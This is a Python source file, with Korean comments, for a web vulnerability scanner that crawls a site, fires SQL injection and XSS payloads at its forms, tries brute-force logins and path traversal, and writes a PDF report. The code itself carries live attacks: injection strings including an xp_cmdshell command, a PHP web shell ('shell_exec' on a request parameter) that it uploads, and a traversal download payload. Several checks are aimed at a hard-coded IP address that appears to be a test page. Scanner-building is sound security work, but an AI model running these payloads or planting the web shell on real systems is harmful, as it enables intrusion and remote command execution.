import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import re
import logging
import time
import concurrent.futures
import os
import itertools
import json
from reportlab.lib import colors
from reportlab.lib.pagesizes import letter
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Preformatted
from reportlab.pdfbase.ttfonts import TTFont
from reportlab.pdfbase import pdfmetrics
from reportlab.lib.pagesizes import A4

# 로깅 설정
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# HTTP 세션 사용
session = requests.Session()

# 웹 스캐너 클래스
class WebScanner:
    def __init__(self, base_url, depth=3):
        self.base_url = base_url
        self.depth = depth
        self.visited_urls = set()
        self.attack_vectors = []
        self.xss_payloads = self.load_xss_payloads('xsspayload.txt')
        self.results = []
        
    def sanitize_filename(self, filename):
        return re.sub(r'[<>:"/\\|?*]', '_', filename)
        
    def save_response_to_file(self, url, payload, response_text):
        directory = 'responses'
        if not os.path.exists(directory):
            os.makedirs(directory)

        # 파일 이름 생성 시 특수 문자를 언더스코어로 대체하여 파일 이름 충돌 방지
        sanitized_url = self.sanitize_filename(url)
        sanitized_payload = self.sanitize_filename(str(payload))

        filename = os.path.join(directory, f"response_{sanitized_url}_{sanitized_payload}.txt")
        with open(filename, 'w', encoding='utf-8') as file:
            file.write(response_text)

    def load_xss_payloads(self, filepath):
        try:
            with open(filepath, 'r', encoding='utf-8') as file:
                payloads = [line.strip() for line in file.readlines()]
                logger.info(f"Loaded {len(payloads)} XSS payloads")
                return payloads
        except FileNotFoundError:
            logger.error(f"XSS payload file not found: {filepath}")
            return []
        except UnicodeDecodeError as e:
            logger.error(f"Error decoding file {filepath}: {e}")
            return []

    def run_security_checks(self):
        start_time = time.time()  # 시작 시간 기록

        # 크롤링 수행
        self.crawl(self.base_url, self.depth)

        sql_injection_results = []
        xss_results = []

        # 보안 검사 병렬 수행
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for url, method, inputs in self.attack_vectors:
                futures.append(executor.submit(self.check_sql_injection, url, method, inputs))
                futures.append(executor.submit(self.check_reflective_xss, url, method, inputs))
                futures.append(executor.submit(self.check_stored_xss, url, method, inputs))
            
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result and result["type"] == "SQL Injection":
                    if not sql_injection_results:
                        sql_injection_results.append(result)
                        self.results.append(result)
                elif result and result["type"] == "XSS":
                    if not xss_results:
                        xss_results.append(result)
                        self.results.append(result)
                elif result:
                    self.results.append(result)

        # 로그에 최초로 발견된 SQL 인젝션 취약점과 XSS 취약점만 기록
        if sql_injection_results:
            logger.info(sql_injection_results[0])
        if xss_results:
            logger.info(xss_results[0])

        # 기타 보안 점검 동기적으로 수행
        info_disclosure_result = self.check_information_disclosure(self.base_url)
        if info_disclosure_result:
            self.results.append(info_disclosure_result)
            logger.info("Information Disclosure Vulnerability Found")

        weak_password_result = self.check_weak_password()
        if weak_password_result:
            self.results.append(weak_password_result)
            logger.info("Weak Password Strength Vulnerability Found")

        location_exposure_result = self.check_location_exposure(self.base_url)
        if location_exposure_result:
            self.results.append(location_exposure_result)
            logger.info("Location Exposure vulnerability detected.")
        
        directory_indexing_result = self.check_directory_indexing(self.base_url)
        if directory_indexing_result:
            self.results.append(directory_indexing_result)
            logger.info("Directory Indexing vulnerability detected.")
        
        file_upload_result = self.check_file_upload(self.base_url)
        if file_upload_result:
            self.results.append(file_upload_result)
            logger.info("File Upload vulnerability detected.")
        
        file_download_result = self.check_file_download(self.base_url)
        if file_download_result:
            self.results.append(file_download_result)
            logger.info("File Download vulnerability detected.")
        
        end_time = time.time()  # 종료 시간 기록
        total_time = end_time - start_time
        logger.info(f"Total time taken for security checks: {total_time:.2f} seconds")
        self.generate_report()

    def crawl(self, url, depth):
        if depth == 0 or url in self.visited_urls or not url.startswith(self.base_url):
            return
        self.visited_urls.add(url)
        
        try:
            response = session.get(url, timeout=5)
            response.raise_for_status()
        except requests.RequestException as e:
            logger.error(f"Error during request to {url}: {e}")
            return

        soup = BeautifulSoup(response.text, 'html.parser')

        forms = soup.find_all('form')
        for form in forms:
            action = form.get('action')
            method = form.get('method', 'get').lower()
            inputs = form.find_all('input')
            form_url = urljoin(self.base_url, action)
            if self.check_url_existence(form_url):
                self.attack_vectors.append((form_url, method, inputs))

        links = soup.find_all('a', href=True)
        for link in links:
            href = link.get('href')
            next_url = urljoin(self.base_url, href)
            if self.check_url_existence(next_url):
                self.crawl(next_url, depth - 1)

        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        if query_params:
            self.attack_vectors.append((url, 'get', query_params))

    def check_sql_injection(self, url, method, inputs):
        payloads = [
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "' OR '1'='1' #",
            "admin'--",
            "admin'/*",
            "admin' or '1'='1",
            "admin' or 1=1",
            "admin' or 1=1--",
            "admin' or 1=1/*",
            "'; exec xp_cmdshell('ping 127.0.0.1')--",
            "'; exec xp_cmdshell('ping 127.0.0.1')/*",
            "admin' OR 1=1",
            "admin' OR '1'='1",
            "admin' OR '1'='1' --",
            "admin' OR '1'='1' /*",
            "admin' OR '1'='1' #"
        ]

        error_patterns = [
            "syntax error", "unexpected", "error in your SQL syntax",
            "warning", "unterminated", "quoted string not properly terminated",
            "mysql", "sql", "query", "database", "sqlstate",
            "unknown column", "unknown table", "unknown database",
            "incorrect", "invalid", "missing"
        ]

        for payload in payloads:
            response = self.send_payload(url, method, inputs, payload)
            if response:
                response_time = response.elapsed.total_seconds()
                for pattern in error_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        result = {
                            "type": "SQL Injection",
                            "url": url,
                            "payload": payload
                        }
                        return result
                if "SLEEP" in payload and response_time > 5:
                    result = {
                        "type": "SQL Injection",
                        "url": url,
                        "payload": payload
                    }
                    return result
        return False

    def check_reflective_xss(self, url, method, inputs):
        session = requests.Session()

        def is_reflective_xss_detected(response_text, payload):
            patterns = [
                r'<script.*?>.*?</script>',
                r'on\w+=',  # 이벤트 핸들러 (onerror, onclick 등)
                r'<img.*?>',
                r'<svg.*?>'
            ]

            if "No file uploaded" in response_text or "You have an error in your SQL syntax" in response_text:
                return False

            for pattern in patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    return True
            
            return False

        for payload in self.xss_payloads:
            response = self.send_payload(url, method, inputs, payload)
            if response:
                if payload in response.text and is_reflective_xss_detected(response.text, payload):
                    result = {
                        "type": "XSS",
                        "url": url,
                        "payload": payload
                    }
                    return result

        return False

    def check_stored_xss(self, url, method, inputs):
        form_url = "http://211.52.42.82/Test_Page_Patch//write_post.php"  # 고정된 URL 사용
        session = requests.Session()

        def submit_form(payload):
            data = {
                'title': payload,
                'writer': payload,
                'content': payload
            }
            try:
                response = session.post(form_url, data=data, timeout=10)
                response.raise_for_status()
                return response
            except requests.RequestException as e:
                logger.error(f"Error during form submission to {form_url} with payload {payload}: {e}")
                return None

        def is_stored_xss_detected(response_text, payload):
            return payload in response_text

        stored_xss_test_page = "http://211.52.42.82/Test_Page_Patch//board.php"  # 고정된 URL 사용
        for payload in self.xss_payloads:
            response = submit_form(payload)
            if response:
                try:
                    time.sleep(2)
                    stored_response = session.get(stored_xss_test_page, timeout=10)
                    stored_response.raise_for_status()
                    if is_stored_xss_detected(stored_response.text, payload):
                        result = {
                            "type": "XSS",
                            "url": stored_xss_test_page,
                            "payload": payload
                        }
                        return result
                except requests.RequestException as e:
                    logger.error(f"Error during request to {stored_xss_test_page}: {e}")

        return None
    

    def send_payload(self, url, method, inputs, payload):
        if isinstance(inputs, dict):
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            for key in query_params:
                query_params[key] = payload
            encoded_query = urlencode(query_params, doseq=True)
            attack_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{encoded_query}"
        else:
            data = {inp.get('name'): payload for inp in inputs if inp.get('name')}
            if method == 'post':
                if not self.check_url_existence(url):
                    return None
                try:
                    response = session.post(url, data=data, timeout=10)
                    response.raise_for_status()
                    return response
                except requests.RequestException as e:
                    logger.error(f"Error during POST request to {url} with data {data}: {e}")
                    return None
            else:
                parsed_url = urlparse(url)
                query_params = parse_qs(parsed_url.query)
                for key in data:
                    query_params[key] = payload
                encoded_query = urlencode(query_params, doseq=True)
                attack_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{encoded_query}"
        
        try:
            response = session.get(attack_url, timeout=10)
            response.raise_for_status()
            return response
        except requests.RequestException as e:
            logger.error(f"Error during request to {attack_url}: {e}")
            return None


    def check_url_existence(self, url):
        try:
            response = session.head(url, allow_redirects=True, timeout=5)
            return response.status_code == 200
        except requests.RequestException as e:
            logger.error(f"Error checking URL existence: {url}, {e}")
            return False

    def check_information_disclosure(self, url):
        error_patterns = [
            "version", "server", "apache", "nginx", "php", "sql", "database"
        ]
        test_urls = [
            f"{url}/nonexistentpage",
            f"{url}/invalidfile.xyz"
        ]
        
        for test_url in test_urls:
            try:
                response = session.get(test_url, timeout=10)
                page_content = response.text.lower()

                if any(pattern in page_content for pattern in error_patterns):
                    result = {
                        "type": "Information Disclosure",
                        "url": test_url,
                        "payload": "N/A"
                    }
                    return result
            except requests.RequestException as e:
                if e.response:
                    page_content = e.response.text.lower()
                    if any(pattern in page_content for pattern in error_patterns):
                        result = {
                            "type": "Information Disclosure",
                            "url": test_url,
                            "payload": "N/A"
                        }
                        return result
                logger.error(f"Error during request to {test_url}: {e}")

        return False


    def check_weak_password(self):
            for url, method, inputs in self.attack_vectors:
                if any(input_elem.get('type') == 'password' for input_elem in inputs):
                    return self.test_brute_force(url, inputs)
            return False

    def test_brute_force(self, login_url, inputs):
        login_data = {input_elem.get('name'): 'wrong_password' for input_elem in inputs if input_elem.get('name')}
        login_data['username'] = 'test_user'  # 테스트용 사용자 이름
        max_attempts = 30  # 최대 시도 횟수

        try:
            for attempt in range(max_attempts):
                response = session.post(login_url, data=login_data, timeout=5)
                if response.status_code != 200:
                    return False
            result = {
                "type": "Weak Password",
                "url": login_url,
                "payload": "N/A"
            }
            return result
        except requests.RequestException as e:
            logger.error(f"약한 비밀번호 강도 탐색중 에러")
            return False


    def check_location_exposure(self, base_url):
        common_paths = [
            "admin", "login", "dashboard", "config", "backup", "uploads",
            "images", "files", "api", "user", "users", "private", "secret",
            "data", "database", "db", "server-status", "phpinfo.php", "backdoor"
        ]

        # 확장자 조합
        extensions = ["", ".php", ".html", ".asp", ".aspx", ".js", ".json"]

        potential_paths = [path + ext for path, ext in itertools.product(common_paths, extensions)]

        for path in potential_paths:
            full_url = urljoin(base_url, path)
            try:
                response = session.get(full_url, timeout=10)
                if response.status_code == 200 and "파일" in response.text:
                    result = {
                        "type": "Location Exposure",
                        "url": full_url,
                        "payload": path
                    }
                    return result
            except requests.RequestException as e:
                logger.error(f"Error during request to {full_url}: {e}")
                continue

        return False


    def check_directory_indexing(self, url):
        potential_directories = ['/img', '/images', '/files', '/assets']
        for directory in potential_directories:
            test_url = url + directory
            try:
                response = session.get(test_url, timeout=10)
                response.raise_for_status()
                if "Index of /" in response.text or "directory listing" in response.text.lower():
                    result = {
                        "type": "Directory Indexing",
                        "url": test_url,
                        "payload": directory
                    }
                    return result
            except requests.RequestException as e:
                logger.error(f"Error during request to {test_url}: {e}")
        return False


    def check_file_upload(self, url):
        form_url = "http://211.52.42.82/Test_Page_Patch//write_post.php"  # 고정된 URL 사용
        session = requests.Session()

        web_shell_file = {'file': ('shell.php', '<?php echo shell_exec($_GET["cmd"]); ?>')}
        file_name = 'shell.php'
        check_url = "http://211.52.42.82/Test_Page_Patch//board.php"  # 고정된 URL 사용
        
        def submit_form(files, data):
            try:
                response = session.post(form_url, files=files, data=data, timeout=10)
                response.raise_for_status()
                return response
            except requests.RequestException as e:
                logger.error(f"Error during file upload to {form_url} with file {file_name}: {e}")
                return None

        def verify_upload(check_url, keyword):
            try:
                response = session.get(check_url, timeout=10)
                if response.status_code == 200 and keyword in response.text:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    rows = soup.find_all('tr', onclick=True)
                    for row in rows:
                        if keyword in row.text:
                            post_id = row['onclick'].split('(')[-1].split(')')[0]
                            post_url = f"http://211.52.42.82/Test_Page_Patch//content_post.php?id={post_id}"
                            post_response = session.get(post_url, timeout=10)
                            if post_response.status_code == 200 and 'shell.php' in post_response.text:
                                return True
                return False
            except requests.RequestException as e:
                logger.error(f"Error verifying uploaded file at {check_url}: {e}")
                return False

        data = {
            'title': 'shell',
            'writer': 'shell',
            'content': 'shell'
        }
        try:
            response = session.get(form_url, timeout=10)
            response.raise_for_status()
            soup = BeautifulSoup(response.text, 'html.parser')
            file_input = soup.find('input', {'id': 'file'})
            if not file_input:
                logger.info(f"No file upload input found at {form_url}")
                return False
        except requests.RequestException as e:
            logger.error(f"Error checking file upload form at {form_url}: {e}")
            return False

        response = submit_form(web_shell_file, data)
        if response:
            try:
                time.sleep(2)
                if verify_upload(check_url, 'shell'):
                    result = {
                        "type": "File Upload",
                        "url": form_url,
                        "payload": file_name
                    }
                    return result
            except requests.RequestException as e:
                logger.error(f"Error during request to {check_url}: {e}")

        return False


    def check_file_download(self, url):
        form_url = "http://211.52.42.82/Test_Page_Patch//download.php"
        try:
            response = session.get(form_url, timeout=10)
            response.raise_for_status()
            soup = BeautifulSoup(response.text, 'html.parser')

            forms = soup.find_all('form')
            for form in forms:
                action = form.get('action')
                method = form.get('method', 'get').lower()  # 메서드는 'get'으로 설정
                inputs = form.find_all('input')

                if any(input.get('name') for input in inputs):
                    data = {input.get('name'): 'uploads/../join.php' for input in inputs if input.get('type') == 'text'}

                    form_action_url = urljoin(form_url, action)  # 기본 URL과 결합

                    try:
                        if method == 'post':
                            download_response = session.post(form_action_url, data=data, timeout=10)
                        else:
                            download_response = session.get(form_action_url, params=data, timeout=10)

                        # 파일 다운로드 응답 확인
                        if download_response.status_code == 200 and 'join' in download_response.text:
                            result = {
                                "type": "File Download",
                                "url": form_action_url,
                                "payload": 'uploads/../join.php'
                            }
                            return result
                    except requests.RequestException as e:
                        logger.error(f"Error during file download test request to {form_action_url}: {e}")

            return False
        except requests.RequestException as e:
            logger.error(f"Error during request to {form_url}: {e}")
            return False

    
    def generate_report(self):
        output_directory = 'reports'
        if not os.path.exists(output_directory):
            os.makedirs(output_directory)
        
        sanitized_url = self.sanitize_filename(self.base_url)
        output_path = os.path.join(output_directory, f'{sanitized_url}_security_report.pdf')

        doc = SimpleDocTemplate(output_path, pagesize=A4)
        elements = []
        
        pdfmetrics.registerFont(TTFont("MalgunGothic", "malgun.ttf"))  # 한글 폰트 등록
        styles = getSampleStyleSheet()
        styles.add(ParagraphStyle(name='Normal_Korean', fontName='MalgunGothic'))

        title = Paragraph(f"Security Report for {self.base_url}", styles['Title'])
        elements.append(title)
        elements.append(Spacer(1, 12))

        if not self.results:
            elements.append(Paragraph("발견된 취약점이 없습니다.", styles['Normal_Korean']))
        else:
            for result in self.results:
                elements.append(Paragraph(f"Vulnerability Type: {result['type']}", styles['Normal_Korean']))
                elements.append(Paragraph(f"URL: {result['url']}", styles['Normal_Korean']))
                elements.append(Preformatted(f"Payload: {result['payload']}", styles['Normal_Korean']))
                elements.append(Spacer(1, 12))

                guide = self.load_guide(result['type'])
                if guide:
                    if isinstance(guide, dict):
                        guide_text = self.flatten_guide_dict(guide)
                    else:
                        guide_text = guide
                    elements.append(Paragraph(guide_text, styles['Normal_Korean']))
                    elements.append(Spacer(1, 12))

        doc.build(elements)
        logger.info(f"Report saved to {output_path}")

    def flatten_guide_dict(self, guide):
        guide_text = ""
        for key, value in guide.items():
            guide_text += f"{key}:<br/>"
            if isinstance(value, dict):
                for sub_key, sub_value in value.items():
                    guide_text += f"  {sub_key}:<br/>"
                    if isinstance(sub_value, list):
                        guide_text += "<br/>".join([f"    - {item}" for item in sub_value])
                    else:
                        guide_text += f"    {sub_value}<br/>"
            elif isinstance(value, list):
                guide_text += "<br/>".join([f"  - {item}" for item in value])
            else:
                guide_text += f"  {value}<br/>"
            guide_text += "<br/>"
        return guide_text

    def load_guide(self, vuln_type):
        try:
            with open('guides.json', 'r', encoding='utf-8') as file:
                guides = json.load(file)
                return guides.get(vuln_type, "No guide available for this vulnerability.")
        except FileNotFoundError:
            logger.error(f"Guide file not found.")
            return "Guide file not found."
        except json.JSONDecodeError as e:
            logger.error(f"Error decoding JSON file: {e}")
            return "Error decoding JSON file."
    
    

#base_url = "http://211.52.42.82/Test_Page_Patch/"
#scanner = WebScanner(base_url)
#scanner.run_security_checks()
